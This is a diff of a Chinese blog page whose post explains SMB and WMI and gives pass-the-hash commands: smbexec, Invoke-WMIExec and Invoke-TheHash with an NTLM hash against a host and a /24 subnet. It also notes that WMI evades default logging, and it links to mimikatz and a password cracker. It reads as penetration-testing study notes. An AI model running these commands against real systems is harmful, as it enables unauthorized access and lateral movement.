@@ -47,12 +47,12 @@
     sidebarPadding: 40
   };
 </script>
-  <meta name="description" content="smb介绍&amp;emsp;&amp;emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP&#x2F;IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就是为什么在">
+  <meta name="description" content="smb介绍&amp;emsp;&amp;emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP&#x2F;IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SMB_RDP_WMI_hash传递探测_利用">
 <meta property="og:url" content="https://chenzidu.github.io/2022/06/02/SMB-RDP-WMI-hash%E4%BC%A0%E9%80%92%E6%8E%A2%E6%B5%8B-%E5%88%A9%E7%94%A8/index.html">
 <meta property="og:site_name" content="Chen&#39;Blog">
-<meta property="og:description" content="smb介绍&amp;emsp;&amp;emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP&#x2F;IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就是为什么在">
+<meta property="og:description" content="smb介绍&amp;emsp;&amp;emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP&#x2F;IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654062783250-d35fada8-94fe-4ec2-8004-665f809dc04f.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=692&id=u09f28a6a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1038&originWidth=1724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128014&status=done&style=none&taskId=udffff2c3-7bde-47c4-a27f-e473f937928&title=&width=1149.3333333333333">
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066837915-33437c7d-ef61-4e52-97f3-ae823c4cbbd5.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=55&id=ua98328a9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=82&originWidth=1618&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24562&status=done&style=none&taskId=uc35fe1c4-3465-4def-88eb-7f95b16d7c6&title=&width=1078.6666666666667">
@@ -271,7 +271,7 @@
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">字数统计:</span>
-           <span class="post-count">859(字)</span>
+           <span class="post-count">862(字)</span>
            
          </span>
 	  
@@ -315,7 +315,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP/IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就是为什么在扫描过程中，我们很可能会同时看到具有在目标上运行的开放端口的协议。<br><br>&emsp;&emsp;使用 SMB 协议，应用程序（或应用程序的用户）可以访问远程服务器上的文件，以及打印机等其他资源。 因此，客户端应用程序可以读取、创建和更新文件远程服务器。 它还可以与任何设置为接收 SMB 客户端的服务器程序通信要求。<br><br>&emsp;&emsp;网络上启用 SMB 的存储称为共享。 任何拥有服务器的地址和正确的凭据。 与许多其他文件访问协议一样，SMB 需要一些安全层在网络拓扑中正常运行。 如果 SMB 允许客户端创建、编辑、<br>检索和删除共享上的文件，显然需要一种身份验证机制。 在用户层面，SMB 客户端需要提供用户名/密码组合才能查看内容或与内容交互SMB共享。<br><br>&emsp;&emsp;如果扫描得到目标IP的TCP445开放，为了成功枚举远程系统上的共享内容，我们可以使用一个名为smb客户端。</p>
+        <h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP&#x2F;IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就是为什么在扫描过程中，我们很可能会同时看到具有在目标上运行的开放端口的协议。<br><br>&emsp;&emsp;使用 SMB 协议，应用程序（或应用程序的用户）可以访问远程服务器上的文件，以及打印机等其他资源。 因此，客户端应用程序可以读取、创建和更新文件远程服务器。 它还可以与任何设置为接收 SMB 客户端的服务器程序通信要求。<br><br>&emsp;&emsp;网络上启用 SMB 的存储称为共享。 任何拥有服务器的地址和正确的凭据。 与许多其他文件访问协议一样，SMB 需要一些安全层在网络拓扑中正常运行。 如果 SMB 允许客户端创建、编辑、<br>检索和删除共享上的文件，显然需要一种身份验证机制。 在用户层面，SMB 客户端需要提供用户名&#x2F;密码组合才能查看内容或与内容交互SMB共享。<br><br>&emsp;&emsp;如果扫描得到目标IP的TCP445开放，为了成功枚举远程系统上的共享内容，我们可以使用一个名为smb客户端。</p>
 <a id="more"></a>
 
 <h3 id="单IP"><a href="#单IP" class="headerlink" title="单IP"></a>单IP</h3><h4 id="smbexec-hash传递"><a href="#smbexec-hash传递" class="headerlink" title="smbexec_hash传递"></a>smbexec_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\smbexec.exe -hashes :<span class="number">973f</span>cd01b987e913cc0209c2f462a751 ./<span class="symbol">administrator@</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span></span><br></pre></td></tr></table></figure>
@@ -334,7 +334,7 @@
 <h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;WMI的全名为”Windows Management Instrumentation”。从win8后，Windows操作系统都支持WMI，WMI可以在本地或者远程管理计算机系统。<br><br>&emsp;&emsp;自从PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单，于是乎攻击者转向使用WMI进行横向移动。在渗透时发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中。因为这个过程不会记录日志，所以对蓝队来说大大增加了溯源的成本。对攻击者来说，被发现的可能性降低，隐蔽性提高。很多APT组织现在都喜欢使用WMI进行攻击。</p>
 <h3 id="单IP-2"><a href="#单IP-2" class="headerlink" title="单IP"></a>单IP</h3><h4 id="WMIExec-hash传递"><a href="#WMIExec-hash传递" class="headerlink" title="WMIExec_hash传递"></a>WMIExec_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure>
 <h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066895951-c8da0db7-1b91-4f33-89e3-4fc7b086dfb4.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=51&id=ub9b3abc8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=77&originWidth=1595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22139&status=done&style=none&taskId=uee3ff694-cdd1-45f5-9577-b21e4592706&title=&width=1063.3333333333333" alt="image.png"></h4><h3 id="网段-2"><a href="#网段-2" class="headerlink" title="网段"></a>网段</h3><h4 id="Ps1-hash传递-1"><a href="#Ps1-hash传递-1" class="headerlink" title="Ps1_hash传递"></a>Ps1_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure>
-<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066316709-eecd7305-9629-4222-9d7d-6625f0e4e047.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=69&id=ue4619d3a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=103&originWidth=1600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30387&status=done&style=none&taskId=u77ff4673-564f-4458-bc6e-df773ce0a5c&title=&width=1066.6666666666667" alt="image.png"></h2><h3 id="超级弱口令检查工具-SMB-RDP"><a href="#超级弱口令检查工具-SMB-RDP" class="headerlink" title="超级弱口令检查工具 SMB/RDP"></a>超级弱口令检查工具 SMB/RDP</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654067044438-186b5985-b19a-40a2-bc65-c295c145f39c.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=701&id=u7a89aa82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1052&originWidth=1312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=206076&status=done&style=none&taskId=ubf7b89bb-8301-4e59-a6ea-77faab429f9&title=&width=874.6666666666666" alt="image.png"></p>
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066316709-eecd7305-9629-4222-9d7d-6625f0e4e047.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=69&id=ue4619d3a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=103&originWidth=1600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30387&status=done&style=none&taskId=u77ff4673-564f-4458-bc6e-df773ce0a5c&title=&width=1066.6666666666667" alt="image.png"></h2><h3 id="超级弱口令检查工具-SMB-RDP"><a href="#超级弱口令检查工具-SMB-RDP" class="headerlink" title="超级弱口令检查工具 SMB&#x2F;RDP"></a>超级弱口令检查工具 SMB&#x2F;RDP</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654067044438-186b5985-b19a-40a2-bc65-c295c145f39c.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=701&id=u7a89aa82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1052&originWidth=1312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=206076&status=done&style=none&taskId=ubf7b89bb-8301-4e59-a6ea-77faab429f9&title=&width=874.6666666666666" alt="image.png"></p>
 <h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a><br><a href="https://github.com/shadow1ng/fscan" target="_blank" rel="noopener">https://github.com/shadow1ng/fscan</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/shack2/SNETCracker" target="_blank" rel="noopener">https://github.com/shack2/SNETCracker</a><br><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p>
 
     </div>
@@ -415,7 +415,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-count">95</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -487,7 +487,7 @@
 <div class="copyright">
   
   &copy; 2018 – 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
